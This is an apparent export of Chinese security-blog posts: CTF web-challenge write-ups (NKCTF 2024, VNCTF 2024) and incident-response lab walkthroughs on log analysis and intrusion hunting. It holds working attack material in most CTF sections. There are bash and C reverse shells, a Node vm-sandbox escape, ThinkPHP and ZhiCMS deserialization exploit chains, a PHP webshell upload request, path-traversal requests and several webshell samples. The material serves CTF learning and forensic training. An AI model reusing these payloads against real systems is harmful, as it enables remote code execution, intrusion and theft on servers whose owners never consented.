[{"categories":["CTF"],"content":" My first CMS通过搜索CVE得知 https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CMS%20Made%20Simple 两个后台RCE分别是CVE-2024-27623和CVE-2024-27622 通过忘记密码功能，得到用户名admin，接着爆破密码 得到密码Admin123，登陆后台RCE即可 ","date":"2024-03-25","objectID":"/nkctf-2024-web/:1:0","tags":["NKCTF Web"],"title":"NKCTF-2024-Web","uri":"/nkctf-2024-web/"},{"categories":["CTF"],"content":" 全世界最简单的CTF const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const fs = require(\"fs\"); const path = require('path'); const vm = require(\"vm\"); app.use(bodyParser.json()).set('views', path.join(__dirname, 'views')).use(express.static(path.join(__dirname, '/public'))) app.get('/', function(req, res) { res.sendFile(__dirname + '/public/home.html'); }) function waf(code) { let pattern = /(process|\\[.*?\\]|exec|spawn|Buffer|\\\\|\\+|concat|eval|Function)/g; if (code.match(pattern)) { throw new Error(\"what can I say? hacker out!!\"); } } app.post('/', function(req, res) { let code = req.body.code; let sandbox = Object.create(null); let context = vm.createContext(sandbox); try { waf(code) let result = vm.runInContext(code, context); console.log(result); } catch(e) { console.log(e.message); require('./hack'); } }) app.get('/secret', function(req, res) { console.log(process.__filename); if (process.__filename == null) { let content = fs.readFileSync(__filename, \"utf-8\"); return res.send(content); } else { let content = fs.readFileSync(process.__filename, \"utf-8\"); return res.send(content); } }) app.listen(3000, () =\u003e { console.log(\"listen on 3000\"); }) 考察vm逃逸，以及RCE绕过 参考文章 https://mp.weixin.qq.com/s/G7RQJVYnwa1KdtnzyP32BA https://www.anquanke.com/post/id/237032 构造出payload throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor(`${`${`return proces`}s`}`))(); const q = p.mainModule.require(`${`${`child_proces`}s`}`) return Reflect.get(q, Reflect.ownKeys(q).find(x=\u003ex.includes(`cSync`)))(`bash -c 'bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261'`).toString() } }) ","date":"2024-03-25","objectID":"/nkctf-2024-web/:2:0","tags":["NKCTF Web"],"title":"NKCTF-2024-Web","uri":"/nkctf-2024-web/"},{"categories":["CTF"],"content":" 用过就是熟悉user/index/loginSubmit存在反序列化 //你知道tp吗？ if($data['name']==='guest'){ unserialize(base64_decode($data['password'])); } 挖一条链子 \u003c?php namespace think\\process\\pipes{ use think\\Collection; class Windows{ private $files = []; public function __construct(){ $this-\u003efiles=[new Collection]; } } echo base64_encode(serialize(new Windows)); } namespace think{ class Collection{ protected $items; public function __construct(){ $this-\u003eitems = new View; } } class View{ protected $data = []; public $engine = []; public function __construct(){ $this-\u003edata[\"Loginout\"]=new Debug; #写入tips $this-\u003eengine['time']=\"10086\"; } } class Debug{ } } ?\u003e 由于文件名存在随机性，所以需要配合本地docker同时写入， import requests import time url1 = \"http://127.0.0.1:3101/?user/index/loginSubmit\" url2 = \"http://89519612-bb1c-465b-921b-d01e8a3ce7e4.node.nkctf.yuzhian.com.cn/?user/index/loginSubmit\" burp0_headers = {\"sec-ch-ua\": \"\\\"Chromium\\\";v=\\\"117\\\", \\\"Not;A=Brand\\\";v=\\\"8\\\"\", \"Accept\": \"application/json, text/javascript, */*; q=0.01\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\", \"sec-ch-ua-mobile\": \"?0\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36\", \"sec-ch-ua-platform\": \"\\\"macOS\\\"\", \"Origin\": \"http://localhost:3101\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Mode\": \"cors\", \"Sec-Fetch-Dest\": \"empty\", \"Referer\": \"http://localhost:3101/\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\"} burp0_data = {\"name\": \"guest\", \"password\": \"TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE2OiJ0aGlua1xDb2xsZWN0aW9uIjoxOntzOjg6IgAqAGl0ZW1zIjtPOjEwOiJ0aGlua1xWaWV3IjoyOntzOjc6IgAqAGRhdGEiO2E6MTp7czo4OiJMb2dpbm91dCI7TzoxMToidGhpbmtcRGVidWciOjA6e319czo2OiJlbmdpbmUiO2E6MTp7czo0OiJ0aW1lIjtzOjU6IjEwMDg2Ijt9fX19fQ==\"} r=requests.post(url1, headers=burp0_headers, data=burp0_data) r=requests.post(url2, headers=burp0_headers, data=burp0_data) print(r.status_code) r=requests.post(url1, headers=burp0_headers, data=burp0_data) 得到文件名 7c5d4e0dc66c95954008f97b3f0cf6fa https://89519612-bb1c-465b-921b-d01e8a3ce7e4.node.nkctf.yuzhian.com.cn/app/controller/user/think/7c5d4e0dc66c95954008f97b3f0cf6f 访问即可得到hint 亲爱的Chu0， 我怀着一颗激动而充满温柔的心，写下这封情书，希望它能够传达我对你的深深情感。或许这只是一封文字，但我希望每一个字都能如我心情般真挚。 在这个瞬息万变的世界里，你是我生命中最美丽的恒定。每一天，我都被你那灿烂的笑容和温暖的眼神所吸引，仿佛整个世界都因为有了你而变得更加美好。你的存在如同清晨第一缕阳光，温暖而宁静。 或许，我们之间存在一种特殊的联系，一种只有我们两个能够理解的默契。 \u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e 而我想告诉你，你就是我心中的那个游客。每一个与你相处的瞬间，都如同解开心灵密码的过程，让我更加深刻地感受到你的独特魅力。 你的每一个微笑，都是我心中最美丽的音符；你的每一句关心，都是我灵魂深处最温暖的拥抱。在这个喧嚣的世界中，你是我安静的港湾，是我倚靠的依托。我珍视着与你分享的每一个瞬间，每一段回忆都如同一颗珍珠，串联成我生命中最美丽的项链。 或许，这封情书只是文字的表达，但我愿意将它寄予你，如同我内心深处对你的深深情感。希望你能感受到我的真挚，就如同我每一刻都在努力解读心灵密码一般。愿我们的故事能够继续，在这段感情的旅程中，我们共同书写属于我们的美好篇章。 POST /?user/index/loginSubmit HTTP/1.1 Host: 192.168.128.2 Content-Length: 162 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.128.2 Referer: http://192.168.128.2/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxx Connection: close name=guest\u0026password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI\u0026rememberPassword=0\u0026salt=1\u0026CSRF_TOKEN=xxx\u0026API_ROUTE=user%2Findex%2FloginSubmit hint: 新建文件 guest/!@!@!@!@NKCTFChu0 在我的文档处上传文件，利用链子去包含即可 \u003c?php system(\"echo '\u003c?php eval(\\$_POST[1]);?\u003e' \u003e /var/www/html/app/1.php\");?\u003e \u003c?php namespace think\\process\\pipes{ use think\\Collection; class Windows{ private $files = []; public function __construct(){ $this-\u003efiles=[new Collection]; } } echo base64_encode(serialize(new Windows)); } namespace think{ class Collection{ protected $items; public function __construct(){ $this-\u003eitems = new View; } } class View{ protected $data = []; public $engine = []; public function __construct(){ $this-\u003edata[\"Loginout\"]=new Config; $this-\u003eengine['name']=\"../../../../../../../../../../../../../../../../var/www/html/data/files/202403/23_fb210ebc/huahua.txt\"; // $this-\u003edata[\"Loginout\"]=new Debug; #写入tips // $this-\u003eengine['time']=\"10086\"; } } class Config{ } # 写入tips // class Debug{ // } } ?\u003e 得到flag ","date":"2024-03-25","objectID":"/nkctf-2024-web/:3:0","tags":["NKCTF Web"],"title":"NKCTF-2024-Web","uri":"/nkctf-2024-web/"},{"categories":["CTF"],"content":" attack_tacoooootacooooo@qq.com:tacooooo 登陆之后，考察CVE-2024-2044 根据此篇文章复现 https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/ nc反弹shell，后找一个linux信息收集脚本找flag 利用wget上传 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS ","date":"2024-03-25","objectID":"/nkctf-2024-web/:4:0","tags":["NKCTF Web"],"title":"NKCTF-2024-Web","uri":"/nkctf-2024-web/"},{"categories":["应急响应"],"content":"1、提交当天访问次数最多的IP，即黑客IP： 2、黑客使用的浏览器指纹是什么，提交指纹的md5： 3、查看index.php页面被访问的次数，提交次数： 4、查看黑客IP访问了多少次，提交次数： 5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数: ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:0:0","tags":["apache日志分析"],"title":"第二章 日志分析 Apache日志分析","uri":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":" Apache日志分析技巧 1、列出当天访问次数最多的IP命令： cut -d- -f 1 log_file|uniq -c | sort -rn | head -20 2、查看当天有多少个IP访问： awk '{print $1}' log_file|sort|uniq|wc -l 3、查看某一个页面被访问的次数： grep \"/index.php\" log_file | wc -l 4、查看每一个IP访问了多少个页面： awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file 5、将每个IP访问的页面数进行从小到大排序： awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n 6、查看某一个IP访问了哪些页面： grep ^111.111.111.111 log_file| awk '{print $1,$7}' 7、去掉搜索引擎统计当天的页面： awk '{print $12,$1}' log_file | grep ^\\\"Mozilla | awk '{print $2}' |sort | uniq | wc -l 8、查看2018年6月21日14时这一个小时内有多少IP访问: awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:1:0","tags":["apache日志分析"],"title":"第二章 日志分析 Apache日志分析","uri":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":"1.黑客第一次写入的shell flag{关键字符串} 2.黑客反弹shell的ip flag{ip} 3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx 4.黑客获取的权限 flag{whoami后的值} 在/tmp/1.sh中反弹了shell bash -i \u003e\u0026/dev/tcp/192.168.100.13/777 0\u003e\u00261 放到河马查杀，得到sh.php 1 2 \u003c?php @eval($_POST['a']);?\u003e 4 //ccfda79e-7aa1-4275-bc26-a6189eb9a20b 根据上面写入webshell的格式 所以猜测可能是udf提权 查看源码得到mysql密码 \u003c?php $conn=mysqli_connect(\"localhost\",\"root\",\"334cc35b3c704593\",\"cms\",\"3306\"); if(!$conn){ echo \"数据库连接失败\"; } show variables like '%plugin%'; cd /usr/lib/mysql/plugin/ 得到 udf.so ps -aux查看mysql服务是以什么用户启动的 因为是mysql用户启动，所以提权后也是mysql用户的权限 flag{mysql} ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:0:0","tags":["mysql应急响应"],"title":"第二章 日志分析 Mysql应急响应","uri":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["应急响应"],"content":"1.web目录存在木马，请找到木马的密码提交 2.服务器疑似存在不死马，请找到不死马的密码提交 3.不死马是通过哪个文件生成的，请提交文件名 4.黑客留下了木马文件，请找出黑客的服务器ip提交 5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交 在/var/www/html目录下面，发现可疑文件1.php .shell.php #1.php \u003c?php eval($_POST[1]);?\u003e #.shell.php \u003c?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?\u003e 解密之后，得hello 在index.php发现不死马 $file = '/var/www/html/.shell.php'; $code = '\u003c?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?\u003e'; file_put_contents($file, $code); system('touch -m -d \"2021-01-01 00:00:01\" .shell.php'); usleep(3000); 存在shell(1).elf文件，判断为木马文件，放入到微步进行分析，得到ip 10.11.55.21 执行shell(1).elf，查看去连接了远程ip的哪个端口 netstat -antlp| grep 10.11.55.21 ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/:0:0","tags":["Linux入侵排查"],"title":"第一章 应急响应 Linux入侵排查","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"},{"categories":["应急响应"],"content":"1.有多少IP在爆破主机ssh的root帐号，如果有多个使用\",“分割 2.ssh爆破成功登陆的IP是多少，如果有多个使用”,“分割 3.爆破用户名字典是什么？如果有多个使用”,“分割 4.登陆成功的IP共爆破了多少次 5.黑客登陆主机后新建了一个后门用户，用户名是多少 ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:0:0","tags":["Linux 日志分析"],"title":"第一章 应急响应 Linux日志分析","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":" 基础日志 登陆失败记录 /var/log/btmp 最后一次登录 /var/log/lastlog 登录成功记录 /var/log/wtmp 登录日志记录 /var/log/secure ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:1:0","tags":["Linux 日志分析"],"title":"第一章 应急响应 Linux日志分析","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":" 日志分析技巧 /var/log/secure 定位有多少IP在爆破主机的root帐号: grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 登陆成功的IP有哪些 grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 分许auth.log日志 查看多少IP在爆破主机ssh的root帐号 grep -a \"Failed password for root\" /var/log/auth.log.1 | awk '{print $11}' | uniq -c | sort -nr | more flag{192.168.200.2,192.168.200.32,192.168.200.31} 登陆成功的IP有哪些 grep -a \"Accepted \" /var/log/auth.log.1 | awk '{print $11}' | uniq -c | sort -nr | more flag{192.168.200.2} 爆破用户名字典是什么？ grep -a \"Failed password\" /var/log/auth.log.1 | perl -e 'while($_=\u003c\u003e){ /for(.*?) from/; print \"$1\\n\";}'| uniq -c | sort -nr flag{user,hello,root,test3,test2,test1} 登陆成功的IP共爆破了多少次 grep -a \"Failed password for root\" /var/log/auth.log.1 | awk '{print $11}' | uniq -c | sort -nr | more grep -a \"Accepted \" /var/log/auth.log.1 | awk '{print $11}' | uniq -c | sort -nr | more flag{4} 黑客登陆主机后新建了一个后门用户，用户名是多少 cat /etc/passwd 查看可疑用户 或者利用 cat /var/log/auth.log.1 |grep -a \"new user\" flag{test2} ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:2:0","tags":["Linux 日志分析"],"title":"第一章 应急响应 Linux日志分析","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["CTF"],"content":" Sign in在game.js中发现关键代码，放到console中执行 var _0x3d9d=[\"\\x56\\x4e\\x43\\x54\\x46\\x7b\\x57\\x33\\x31\\x63\\x30\\x6d\\x33\\x5f\\x74\\x30\\x5f\\x56\\x4e\\x43\\x54\\x46\\x5f\\x32\\x30\\x32\\x34\\x5f\\x67\\x40\\x6f\\x64\\x5f\\x4a\\x30\\x42\\x21\\x21\\x21\\x21\\x7d\"]; console.log(_0x3d9d[0]); 获得flag VNCTF{W31c0m3_t0_VNCTF_2024_g@od_J0B!!!!} ","date":"2024-03-15","objectID":"/vnctf-2024-web/:1:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" TrySentpoc POST /user/upload/upload HTTP/1.1 Host: 2180fc06-45c6-4306-8e86-637be6a3025a.vnctf2024.manqiu.top Content-Length: 758 Sec-Ch-Ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\" Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Sec-Ch-Ua-Platform: \"Windows\" Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrhx2kYAMYDqoTThz Accept: */* Origin: https://info.ziwugu.vip/ Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://target.com/user/upload/index?name=icon\u0026type=image\u0026limit=1 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ja-CN;q=0.8,ja;q=0.7,en;q=0.6 Connection: close ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"id\" WU_FILE_0 ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"name\" test.jpg ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"type\" image/jpeg ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"lastModifiedDate\" Wed Jul 21 2021 18:15:25 GMT+0800 (中国标准时间) ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"size\" 164264 ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"file\"; filename=\"test.php\" Content-Type: image/jpeg JFIF \u003c?=`$_GET[1]`;?\u003e ------WebKitFormBoundaryrhx2kYAMYDqoTThz-- ","date":"2024-03-15","objectID":"/vnctf-2024-web/:2:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" Referencehttps://blog.hanayuzu.top/articles/37dacab4 ","date":"2024-03-15","objectID":"/vnctf-2024-web/:2:1","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" givephp劫持LD_PRELOAD变量 写一个reverseshell #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cunistd.h\u003e #include \u003cnetinet/in.h\u003e #include \u003csys/types.h\u003e #include \u003csys/socket.h\u003e #define REMOTE_ADDR \"ip\" #define REMOTE_PORT port __attribute__((__constructor__)) void preload(void) { struct sockaddr_in sa; int s; sa.sin_family = AF_INET; sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR); sa.sin_port = htons(REMOTE_PORT); s = socket(AF_INET, SOCK_STREAM, 0); connect(s, (struct sockaddr *)\u0026sa, sizeof(sa)); dup2(s, 0); dup2(s, 1); dup2(s, 2); execve(\"/bin/sh\", 0, 0); } 编译共享库 gcc -fPIC exp.c -o exp.so /?challenge=1\u0026key=LD_PRELOAD\u0026value=/tmp/uploaded_file_65d06b74e02569.16227496.so\u0026guess=%00lambda_1 ","date":"2024-03-15","objectID":"/vnctf-2024-web/:3:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" CutePath/chfs/files?filepath=../ 存在目录遍历 得到账号和密码 admin:gdgm.edu.cn@M1n9K1n9P@as 登陆之后，得到更多的功能点 通过目录遍历，得到flag文件的位置 ../../../flag/flag/flag.txt 存在重命名功能点，并且跨目录，直接将flag.txt文件移动到web目录即可 POST /chfs/rename ------WebKitFormBoundary4GWMTiRPXoB99YrX Content-Disposition: form-data; name=\"new\" ../../../home/ming/share_main/flag.txt ------WebKitFormBoundary4GWMTiRPXoB99YrX Content-Disposition: form-data; name=\"old\" ../../../flag/flag/flag.txt ------WebKitFormBoundary4GWMTiRPXoB99YrX-- 访问/chfs/shared/flag.txt?v=1得到flag VNCTF{564e406840636b3156315f6764676d} ","date":"2024-03-15","objectID":"/vnctf-2024-web/:4:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" codefever_again根据 https://github.com/PGYER/codefever/issues/140 来打 ","date":"2024-03-15","objectID":"/vnctf-2024-web/:5:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" zhi","date":"2024-03-15","objectID":"/vnctf-2024-web/:6:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" Unserialize RCE在giftcontroller控制器下面存在如下方法 public function globallike(){ $mylike=$_COOKIE['mylike']; $arr = unserialize($mylike); echo count($arr); } 很明显存在一个unserialize 全局搜索__destruct，利用simple_html_dom类中的__destruct方法 function __destruct() { $this-\u003eclear(); } 跟进查看clear() function clear() { foreach ($this-\u003enodes as $n) {$n-\u003eclear(); $n = null;} // This add next line is documented in the sourceforge repository. 2977248 as a fix for ongoing memory leaks that occur even with the use of clear. if (isset($this-\u003echildren)) foreach ($this-\u003echildren as $n) {$n-\u003eclear(); $n = null;} if (isset($this-\u003eparent)) {$this-\u003eparent-\u003eclear(); unset($this-\u003eparent);} if (isset($this-\u003eroot)) {$this-\u003eroot-\u003eclear(); unset($this-\u003eroot);} unset($this-\u003edoc); unset($this-\u003enoise); } 这里可以任意调用__call()方法，或者clear()方法 这里利用MemcachedDriver类中的clear()方法 public function clear() { return $this-\u003emmc-\u003eset($this-\u003egroup.'_ver', $this-\u003ever+1); } 利用拼接进行触发__toString方法，选择simple_html_dom_node类 function __toString() { return $this-\u003eoutertext(); } 进入outertext()方法 function outertext() { global $debugObject; if (is_object($debugObject)) { $text = ''; if ($this-\u003etag == 'text') { if (!empty($this-\u003etext)) { $text = \" with text: \" . $this-\u003etext; } } $debugObject-\u003edebugLog(1, 'Innertext of tag: ' . $this-\u003etag . $text); } if ($this-\u003etag==='root') return $this-\u003einnertext(); // trigger callback if ($this-\u003edom \u0026\u0026 $this-\u003edom-\u003ecallback!==null) { call_user_func_array($this-\u003edom-\u003ecallback, array($this)); } 其中可以调用到call_user_func_array($this-\u003edom-\u003ecallback, array($this));方法，但是无法控制第二个参数，所以只能调用到任意类的任意方法并且参数只能是一个 这里利用Template类中的display方法 public function display($tpl = '', $return = false, $isTpl = true ) { if( $return ){ if ( ob_get_level() ){ ob_end_flush(); flush(); } ob_start(); } extract($this-\u003evars, EXTR_OVERWRITE); eval('?\u003e' . $this-\u003ecompile( $tpl, $isTpl)); if( $return ){ $content = ob_get_contents(); ob_end_clean(); return $content; } } 可以利用extract($this-\u003evars, EXTR_OVERWRITE);来控制$this-\u003ecompile( $tpl, $isTpl)中的参数，跟进查看是否能控制其返回内容 public function compile( $tpl, $isTpl = true ) { if( $isTpl ){ $tplFile = $this-\u003econfig['TPL_PATH'] . $tpl . $this-\u003econfig['TPL_SUFFIX']; if ( !file_exists($tplFile) ) { throw new \\Exception(\"Template file '{$tplFile}' not found\", 500); } $tplKey = md5(realpath($tplFile)); } else { $tplKey = md5($tpl); } $ret = unserialize( $this-\u003ecache-\u003eget( $tplKey ) ); if ( empty($ret['template']) || ($isTpl\u0026\u0026filemtime($tplFile)\u003e($ret['compile_time'])) ) { $template = $isTpl ? file_get_contents( $tplFile ) : $tpl; if( false === Hook::listen('templateParse', array($template), $template) ){ foreach ($this-\u003elabel as $key =\u003e $value) { $template = preg_replace($key, $value, $template); } } $ret = array('template'=\u003e$template, 'compile_time'=\u003etime()); $this-\u003ecache-\u003eset( $tplKey, serialize($ret), 86400*365); } return $ret['template']; } 可以看到，如果能控制unserialize($this-\u003ecache-\u003eget( $tplKey ))的内容，便可以控制返回内容，这里全局搜索一下get()方法 这里利用FileCacheDriver中的get()方法 public function get( $key ){ $content = @file_get_contents( $this-\u003e_getFilePath($key) ); if( empty($content) ) return false; $expire = (int) substr($content, 13, 12); if( time() \u003e= $expire ) return false; $md5Sign = substr($content, 25, 32); $content = substr($content, 57); if( $md5Sign != md5($content) ) return false; return @unserialize($content); } 从$this-\u003e_getFilePath方法中获取内容，并且进行了一些判断，然后反序列化后返回内容，跟进其方法 private function _getFilePath($key, $isCreatePath = false){ $key = md5($key); $dir = $this-\u003econfig['CACHE_PATH'] . '/' . $this-\u003econfig['GROUP'] . '/'; for($i=0; $i\u003c$this-\u003econfig['HASH_DEEP']; $i++){ $dir = $dir. substr($key, $i*2, 2).'/'; } $dir = str_replace('/', DIRECTORY_SEPARATOR, $dir); if ( !file_exists($dir) ) { if ( !@mkdir($dir, 0777, true) ){ throw new \\Exception(\"Can not create dir '{$dir}'\", 500); } } if ( !is_writable($dir) ) @chmod($dir, 0777); return $dir. $key . '.php';; } 进行了一些目录文件名拼接的操作，然后返回一个php文件，但是我们并没有这个文件，所以会进入compile()方法中的if条件 if ( empty($ret['template']) || ($isTpl\u0026\u0026filemtime($tplFile)\u003e($ret['compile_time'])) ) { $template = $isTpl ? file_get_contents( $tplFile ) : $tpl; if( false === Hook::listen('templateParse', array($template), $template) ){ foreach ($this-\u003elabel as $key =\u003e $value) { $template = preg_replace($key, $value, $template); } } $ret = array('template'=\u003e$template, 'compile_time'=\u003etime()); $this-\u003ecache-\u003eset( $tplKey, serialize($ret), 86400*365); } 内容就是传入的$tpl，接着调用$this-\u003ecache-\u003eset()方法，写入内容 这里就利用FileCacheDriver类中的set()方法 public function set($key, $value, $expire = 1800){ $value = serialize($value); $md5Sign = md5($value); $expire = time() + $expire; $content = '\u003c?php exit;?\u003e' . sprintf('%012d', $expire) . $md5Sign . $value; return @file_put_contents($this-\u003e_getFilePath($key, true), $content, LOCK_EX); } 构造完整poc \u003c?php namespace ZhiCms\\ext{ use ZhiCms\\base\\cache\\MemcachedDriver; use ZhiCms\\base\\Template; class simple_html_dom{ public $nodes = array(); public function __construct(){ $this-\u003enodes[] = new MemcachedDriver; } } class simple_html_dom_node{ private $dom; public function __construct(){ $this-\u003edom-\u003ecallback = array(new Template,'display'); } } class Send { public function __construct(){ } } echo urlencode(serialize(new simple_html_dom)); } namespace ZhiCms\\base\\cache{ use ZhiCms\\ext\\simple_html_dom_node; use ZhiCms\\ext\\Send; class FileCacheDriver{ public function __construct(){ } } class MemcachedDriver{ protected $group = ''; protected $mmc = NULL; public function __construct(){ $this-\u003egroup = new simple_html_dom_node; $this-\u003emmc = new Send(); } } } namespace ZhiCms\\base{ use ZhiCms\\base\\cache\\FileCacheDriver; class Template { protected $vars = array(); protected $cache; public function __construct(){ $this-\u003evars=array(\"tpl\"=\u003e\"\u003c?=phpinfo();?\u003e\",\"isTpl\"=\u003efalse); $this-\u003ecache = new FileCacheDriver; } } } ?\u003e ","date":"2024-03-15","objectID":"/vnctf-2024-web/:6:1","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["代码审计"],"content":" 0x01 xxxx-mgr系统看完安装流程，先从web端入手，几套系统均采用Yii二开，在此先学习一下Yii的基础知识 https://www.yiiframework.com/doc/guide/2.0/zh-cn 